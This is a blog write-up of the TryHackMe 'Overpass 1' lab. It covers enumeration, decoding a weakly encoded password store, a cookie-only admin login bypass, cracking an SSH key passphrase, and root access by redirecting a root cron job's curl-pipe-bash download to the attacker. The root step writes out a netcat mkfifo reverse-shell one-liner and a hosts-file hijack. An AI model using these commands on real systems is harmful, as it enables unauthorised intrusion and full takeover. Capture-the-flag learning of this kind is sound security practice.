---
layout: project
type: project
image: images/writeups/thm/overpass-1/logo.png
title: Overpass 1 - TryHackMe
permalink: writeups/overpass-1
# All dates must be YYYY-MM-DD format!
date: 2021-03-22
labels:
  - TryHackMe
  - boot2root
  - easy
summary: What happens when some broke CompSci students make a password manager?
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/overpass-1/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = OVERPASS 1
TARGET = VARIABLE
TUN0 = 10.9.169.84
OS = LINUX
DIFFICULTY = EASY
```
## Enumeration

Starting with an nmap scan

```console
~/Documents/tryhackme/overpass-series/1 ❯ sudo nmap -sS -sV -T5 -A 10.10.204.45 | tee nmap-init
[sudo] password for nullcell:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 13:23 WAT
Nmap scan report for 10.10.204.45
Host is up (0.20s latency).
Not shown: 564 closed ports, 434 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   196.12 ms 10.9.0.1
2   196.26 ms 10.10.204.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.36 seconds
```

I noticed a golang http server, not popular but okay i guess, and decided to run nikto and then gobuster while i do some manual enumeration on the site
Upon inspecting the source code of the main page i stumble on a comment which said, "<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->"
I checked what encryption the romans used and found "The Caesar Shift Cipher Was Used By the Roman Army"
I also found the admin page

```console
~/Documents/tryhackme/overpass-series/1 ❯ cat gobuster-big-init
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
~/Documents/tryhackme/overpass-series/1 ❯ cat nikto.log
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.204.45
+ Target Hostname:    10.10.204.45
+ Target Port:        80
+ Start Time:         2021-02-09 13:26:58 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /admin.html: This might be interesting...
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3092: /downloads/: This might be interesting...
+ OSVDB-3092: /img/: This might be interesting...
+ 7891 requests: 1 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-02-09 13:55:13 (GMT1) (1695 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Enumerating the site i got the bianries as well as the source code for the application
Looking at the go code i find a potential username, "Steve"
I tested the application and noticed that it created a .overpass file

```shell_session
~/Documents/tryhackme/overpass-series/1 ❯ ./overpassLinux
open /home/nullcell/.overpass: no such file or directory
Failed to open or read file
Continuing with new password file.
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       2
Enter Service Name:     admin
Enter new password:     password
~/Documents/tryhackme/overpass-series/1 ❯ ./overpassLinux
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       4
admin    password
~ ❯ cat .overpass
,LQ?2>6QiQ25>:?Q[QA2DDQiQA2DDH@C5QN.
```

After decoding the contents of the .overpass file i got
[{"name":"admin","pass":"password"}]

I looked at the source code for /admin login page and found the javascript file which handles the login
I found that it requres only the presence of a cookie name "SessionToken" for it to authenticate
I created the cookie and got an rsa private key and a username

```sh
#login function form /login.js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}

#/admin page after creating SessionToken cookie
<div>
            <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
            <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>
                Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
            <pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----</pre>
        </div>
    </div>

```

## Exploitation

I went on the crack the ssh private key to get the passphrase

```console
~/Documents/tryhackme/overpass-series/1 ❯ python /usr/share/john/ssh2john.py id_rsa_james > id_rsa_james.hash
~/Documents/tryhackme/overpass-series/1 ❯ john --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh id_rsa_james.hash | tee james-key
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Will run 3 OpenMP threads
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa_james)
1g 0:00:00:04 DONE (2021-02-09 14:55) 0.2183g/s 3131Kp/s 3131Kc/s 3131KC/s     1990..*7¡Vamos!
Session completed
```

I then logged in to the machine via ssh with the credentials

```console
~/Documents/tryhackme/overpass-series/1 ❯ ssh -i id_rsa_james james@10.10.204.45
The authenticity of host '10.10.204.45 (10.10.204.45)' can't be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.204.45' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa_james':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Feb  9 13:59:46 UTC 2021

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 13%                IP address for eth0: 10.10.204.45
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ uname -a; w; id
Linux overpass-prod 4.15.0-108-generic #109-Ubuntu SMP Fri Jun 19 11:33:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:00:05 up  1:40,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
james    pts/0    10.9.169.84      13:59    5.00s  0.06s  0.02s w
uid=1001(james) gid=1001(james) groups=1001(james)

```
## Privilege Escalation

Upon logging in i find 3 important files, user.txt, todo.txt and .overpass

```console
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@overpass-prod:~$ cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

I decoded the contents of .overpass to get his credentials

```
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

I checked the crontab file for cronjobs and found one that runs as root
it executed the build script from the hostname overpass.thm
I checked /etc/hosts and saw it was just the localhost
I then checked the persmissions for /etc/hosts and found that i had read and write permissions so I could change the ip of overpass.thm and have it execute a reverse shell I create
```console
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:~$ ls -lsa /etc/hosts
4 -rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts

#modifying the /etc/hosts file
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.9.169.84 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

I then created a folder structure as server/downloads/buildscript.sh and put a reverse shell in it
I started a netcat listener and started a python server on port 80 in the server directory
after about 30 seconds i got a shell as root

```console
~/Documents/tryhackme/overpass-series/1/server ❯ tree
.
└── downloads
    └── src
        └── buildscript.sh

2 directories, 1 file
~/Documents/tryhackme/overpass-series/1/server ❯ cat downloads/src/buildscript.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.169.84 4444 >/tmp/f
~/Documents/tryhackme/overpass-series/1/server ❯ sudo python3 -m http.server 80
[sudo] password for nullcell:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.204.45 - - [09/Feb/2021 15:36:34] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -

##reverse shell
~/Documents/tryhackme/overpass-series/1 ❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.204.45 56120
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

pwned